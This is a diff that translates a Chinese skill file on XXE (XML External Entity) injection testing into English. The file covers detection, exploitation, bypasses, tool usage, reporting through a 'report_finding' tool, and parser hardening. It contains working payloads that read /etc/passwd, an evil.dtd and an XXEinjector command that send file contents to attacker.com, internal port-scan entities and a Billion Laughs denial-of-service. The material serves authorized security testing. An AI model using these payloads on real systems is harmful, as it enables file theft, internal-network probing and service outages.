@@ -1,37 +1,37 @@
 ---
 name: xxe-testing
-description: XXE XML外部实体注入测试的专业技能和方法论
+description: Professional skills and methodology for XXE (XML External Entity) injection testing
 version: 1.0.0
 ---
 
-# XXE XML外部实体注入测试
+# XXE (XML External Entity) Injection Testing
 
-## 概述
+## Overview
 
-XXE（XML External Entity）注入是一种利用XML解析器处理外部实体的漏洞。本技能提供XXE漏洞的检测、利用和防护方法。
+XXE injection exploits how XML parsers process external entities. This skill provides detection, exploitation, and defense methods for XXE vulnerabilities.
 
-## 漏洞原理
+## How it works
 
-XML解析器在处理外部实体时，可能读取本地文件、进行SSRF攻击或导致拒绝服务。常见于：
-- XML文档解析
-- SOAP服务
-- Office文档（.docx, .xlsx等）
-- SVG图片
-- PDF文件
+While processing external entities, an XML parser may read local files, perform SSRF, or cause denial of service. Common in:
+- XML document parsing
+- SOAP services
+- Office documents (.docx, .xlsx, etc.)
+- SVG images
+- PDF files
 
-## 测试方法
+## Testing methodology
 
-### 1. 识别XML输入点
+### 1. Identify XML input points
 
-- 文件上传功能
-- API接口接受XML数据
-- SOAP请求
-- Office文档处理
-- 数据导入功能
+- File upload features
+- API endpoints accepting XML
+- SOAP requests
+- Office document processing
+- Data import features
 
-### 2. 基础XXE检测
+### 2. Basic XXE detection
 
-**测试外部实体：**
+**Test external entities:**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
@@ -40,7 +40,7 @@ XML解析器在处理外部实体时，可能读取本地文件、进行SSRF攻�
 <foo>&xxe;</foo>
 ```
 
-**测试网络请求（SSRF）：**
+**Test network requests (SSRF):**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
@@ -49,9 +49,9 @@ XML解析器在处理外部实体时，可能读取本地文件、进行SSRF攻�
 <foo>&xxe;</foo>
 ```
 
-### 3. 盲XXE检测
+### 3. Blind XXE detection
 
-**当响应不直接显示内容时：**
+**When the response doesn't show content directly:**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
@@ -60,7 +60,7 @@ XML解析器在处理外部实体时，可能读取本地文件、进行SSRF攻�
 <foo>&xxe;</foo>
 ```
 
-**使用参数实体：**
+**Using parameter entities:**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
@@ -70,7 +70,7 @@ XML解析器在处理外部实体时，可能读取本地文件、进行SSRF攻�
 <foo>test</foo>
 ```
 
-**evil.dtd内容：**
+**evil.dtd contents:**
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%file;'>">
@@ -78,11 +78,11 @@ XML解析器在处理外部实体时，可能读取本地文件、进行SSRF攻�
 %exfil;
 ```
 
-## 利用技术
+## Exploitation techniques
 
-### 文件读取
+### File reading
 
-**读取本地文件：**
+**Read local files:**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
@@ -91,14 +91,14 @@ XML解析器在处理外部实体时，可能读取本地文件、进行SSRF攻�
 <foo>&xxe;</foo>
 ```
 
-**Windows路径：**
+**Windows paths:**
 ```xml
 <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
 ```
 
-### SSRF攻击
+### SSRF attacks
 
-**内网探测：**
+**Internal-network probing:**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
@@ -107,16 +107,16 @@ XML解析器在处理外部实体时，可能读取本地文件、进行SSRF攻�
 <foo>&xxe;</foo>
 ```
 
-**端口扫描：**
+**Port scanning:**
 ```xml
 <!ENTITY xxe SYSTEM "http://127.0.0.1:22">
 <!ENTITY xxe SYSTEM "http://127.0.0.1:3306">
 <!ENTITY xxe SYSTEM "http://127.0.0.1:6379">
 ```
 
-### 拒绝服务
+### Denial of service
 
-**Billion Laughs攻击：**
+**Billion Laughs attack:**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
@@ -133,15 +133,15 @@ XML解析器在处理外部实体时，可能读取本地文件、进行SSRF攻�
 <foo>&lol9;</foo>
 ```
 
-### Office文档XXE
+### Office-document XXE
 
-**docx文件结构：**
+**docx structure:**
 ```
-word/document.xml - 包含文档内容
-word/_rels/document.xml.rels - 包含外部引用
+word/document.xml - document content
+word/_rels/document.xml.rels - external references
 ```
 
-**修改document.xml.rels：**
+**Modify document.xml.rels:**
 ```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Relationships>
@@ -149,28 +149,28 @@ word/_rels/document.xml.rels - 包含外部引用
 </Relationships>
 ```
 
-## 绕过技术
+## Bypass techniques
 
-### 不同协议
+### Alternate protocols
 
-**PHP：**
+**PHP:**
 ```xml
 <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
 ```
 
-**Java：**
+**Java:**
 ```xml
 <!ENTITY xxe SYSTEM "jar:file:///path/to/file.zip!/file.txt">
 ```
 
-**编码绕过：**
+**Encoding bypass:**
 ```xml
 <!ENTITY xxe SYSTEM "file:///%65%74%63/%70%61%73%73%77%64">
 ```
 
-### 参数实体
+### Parameter entities
 
-**利用参数实体绕过某些限制：**
+**Use parameter entities to bypass some restrictions:**
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
@@ -180,47 +180,47 @@ word/_rels/document.xml.rels - 包含外部引用
 <foo>test</foo>
 ```
 
-## 工具使用
+## Tool usage
 
 ### XXEinjector
 
 ```bash
-# 基础使用
+# Basic usage
 ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml
 
-# 文件读取
+# File reading
 ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml --oob=http://attacker.com --path=/etc/passwd
 ```
 
 ### Burp Suite
 
-1. 拦截包含XML的请求
-2. 发送到Repeater
-3. 修改XML内容，添加外部实体
-4. 观察响应或外带数据
+1. Intercept a request containing XML
+2. Send to Repeater
+3. Modify the XML to add external entities
+4. Watch the response or out-of-band data
 
-## 验证和报告
+## Verification and reporting
 
-### 验证步骤
+### Verification steps
 
-1. 确认XML解析器处理外部实体
-2. 验证文件读取或SSRF是否成功
-3. 评估影响范围（敏感文件、内网访问等）
-4. 记录完整的POC
-5. 通过 `report_finding` 工具将确认的漏洞录入平台（本平台记录漏洞的唯一入口），字段涵盖位置、类型、严重度、复现步骤/PoC 与修复建议
+1. Confirm the XML parser processes external entities
+2. Verify file reading or SSRF succeeds
+3. Assess the impact (sensitive files, internal-network access, etc.)
+4. Record a complete PoC
+5. Log the confirmed vulnerability via the `report_finding` tool (the platform's sole entry point for recording vulnerabilities), covering location, type, severity, reproduction steps/PoC, and remediation advice
 
-### 报告要点
+### Reporting essentials
 
-- 漏洞位置和XML输入点
-- 可读取的文件或可访问的内网资源
-- 完整的利用步骤和PoC
-- 修复建议（禁用外部实体、使用白名单等）
+- Vulnerability location and XML input point
+- Readable files or reachable internal resources
+- Complete exploitation steps and PoC
+- Remediation advice (disable external entities, allowlists, etc.)
 
-## 防护措施
+## Defenses
 
-### 推荐方案
+### Recommended
 
-1. **禁用外部实体**
+1. **Disable external entities**
    ```java
    // Java
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
@@ -229,17 +229,17 @@ ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml --oob=http:
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    ```
 
-2. **使用白名单验证**
-   - 验证XML结构
-   - 限制允许的实体
+2. **Allowlist validation**
+   - Validate the XML structure
+   - Restrict allowed entities
 
-3. **使用安全的解析器**
-   - 使用不处理DTD的解析器
-   - 使用JSON替代XML
+3. **Use safe parsers**
+   - Use parsers that don't process DTDs
+   - Prefer JSON over XML
 
-## 注意事项
+## Notes
 
-- 仅在授权测试环境中进行
-- 避免读取敏感文件造成数据泄露
-- 注意不同语言和库的XXE处理差异
-- 测试Office文档时注意文件格式
+- Test only in authorized environments
+- Avoid reading sensitive files and causing data leakage
+- Mind XXE handling differences across languages and libraries
+- Pay attention to file formats when testing Office documents
